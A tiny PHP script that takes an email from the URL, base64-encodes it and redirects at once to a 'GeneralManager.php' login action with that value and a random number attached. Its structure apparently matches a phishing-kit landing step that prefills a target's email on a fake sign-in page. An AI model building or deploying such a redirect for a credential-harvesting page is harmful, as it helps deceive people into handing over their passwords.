<?php

$oslo=rand(); 
$praga=md5($oslo);

$email = $_GET['email'];

$link = "GeneralManager.php";
$cid = base64_encode($email);
$sess = "?action=Login&cid=$cid&rand=$oslo";

header ("Refresh: 0; url=$link$sess");

?>